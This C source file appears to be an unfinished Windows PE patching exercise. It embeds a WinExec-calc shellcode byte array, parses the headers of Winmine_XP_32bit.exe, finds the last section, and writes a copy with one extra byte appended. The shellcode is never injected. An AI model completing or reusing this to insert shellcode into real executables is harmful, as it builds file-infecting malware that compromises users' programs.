#include "pe_struct.h"
/*
*/
#include <stdio.h>
#include <tchar.h>
int PrintNumber(__in int nNumber)
{
  _TCHAR szBuffer[100];
  
  _stprintf(szBuffer, _T("%i"), nNumber);
  return MessageBox(NULL, szBuffer, _T("wat"), MB_OK);
}
void print_128_bit_chunk( unsigned char* chunk ) {
    printf( "%08x %08x %08x %08x\n" ,
            chunk[0] << 24 | chunk[1] << 16 | chunk[2] << 8 | chunk[3] ,
            chunk[4] << 24 | chunk[5] << 16 | chunk[6] << 8 | chunk[7] ,
            chunk[8] << 24 | chunk[9] << 16 | chunk[10] << 8 | chunk[11] ,
            chunk[12] << 24 | chunk[13] << 16 | chunk[14] << 8 | chunk[15] ) ;
}
unsigned char shellcode[] = 
"\x50\x54\x58\x66\x83\xe4\xf0\x50\x31\xc0\x40\x92\x74\x50\x60" 
"\x4a\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72\x30" 
"\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f\x3c" 
"\x8b\x5c\x3b\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x54\x1f\x24\x0f" 
"\xb7\x2c\x17\x42\x42\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xf0" 
"\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7\x58\x58\x61\x5c" 
"\x92\x58\xeb\x66\x50\x51\x53\x56\x57\x55\xb2\x60\x68\x63\x61" 
"\x6c\x63\x54\x59\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18" 
"\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57" 
"\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f" 
"\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e" 
"\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01" 
"\xf7\x99\xff\xd7\x48\x83\xc4\x68\x5d\x5f\x5e\x5b\x59\x5a\x5c" 
"\x58" ;
int main( ) {
	HANDLE hFile = CreateFile( L"Winmine_XP_32bit.exe" , GENERIC_READ , FILE_SHARE_READ , NULL , OPEN_EXISTING , 0 , NULL ) ;
	HANDLE hFile_out =  CreateFile(L"Winmine_XP_32bit___.exe",                // name of the write
                       GENERIC_WRITE,          // open for writing
                       0,                      // do not share
                       NULL,                   // default security
                       CREATE_NEW|OPEN_EXISTING,             // create new file only
                       FILE_ATTRIBUTE_NORMAL,  // normal file
                       NULL); 
	if( hFile != INVALID_HANDLE_VALUE && hFile_out != INVALID_HANDLE_VALUE ) {
        DWORD dwFileSize = GetFileSize(hFile, NULL); 
        if (dwFileSize != INVALID_FILE_SIZE)
        { 
            BYTE* pszFileText = (BYTE*) LocalAlloc(LMEM_FIXED, dwFileSize); 
            if (pszFileText != NULL)
            {
                DWORD dwRead,dwWrite; 
				WORD number_of_section ;
				IMAGE_DOS_HEADER* p_dos_header ;
				IMAGE_NT_HEADERS* p_nt_header ;
				IMAGE_SECTION_HEADER* p_section_header ;
				IMAGE_SECTION_HEADER* last_section_header ;
				BYTE* pszFileText_out ;
				ReadFile(hFile, pszFileText, dwFileSize, &dwRead, NULL);
				if( dwRead < dwFileSize ) {
					MessageBox( NULL , L"内存不足无法读取" , NULL , NULL ) ;
					exit( -1 ) ;
				}
				p_dos_header = ( IMAGE_DOS_HEADER* )pszFileText ;
				p_nt_header = ( IMAGE_NT_HEADERS* )( pszFileText + p_dos_header->e_lfanew ) ;
				number_of_section = p_nt_header->FileHeader.NumberOfSections ;
				p_section_header = ( IMAGE_SECTION_HEADER* )( pszFileText + p_dos_header->e_lfanew + sizeof( IMAGE_NT_HEADERS ) ) ;
				last_section_header = ( IMAGE_SECTION_HEADER* )( ( BYTE* )p_section_header + ( number_of_section - 1 ) * sizeof( IMAGE_SECTION_HEADER ) ) ;
				pszFileText_out = (BYTE*) LocalAlloc(LMEM_FIXED, dwFileSize+1); 
				CopyMemory( pszFileText_out , pszFileText , dwFileSize ) ;
				CopyMemory( pszFileText_out + dwFileSize , "\x44" , 1 ) ;
				WriteFile( 
                    hFile_out,           // open file handle
                    pszFileText_out,      // start of data to write
                    dwFileSize+1,  // number of bytes to write
                    &dwWrite, // number of bytes that were written
                    NULL);  
                LocalFree(pszFileText);
                LocalFree(pszFileText_out);
            } 
        } 
        CloseHandle(hFile); 
        CloseHandle(hFile_out); 
	}
	else{
		MessageBox( NULL , L"open file failed" , NULL , NULL ) ;
	}
	return 0 ;
}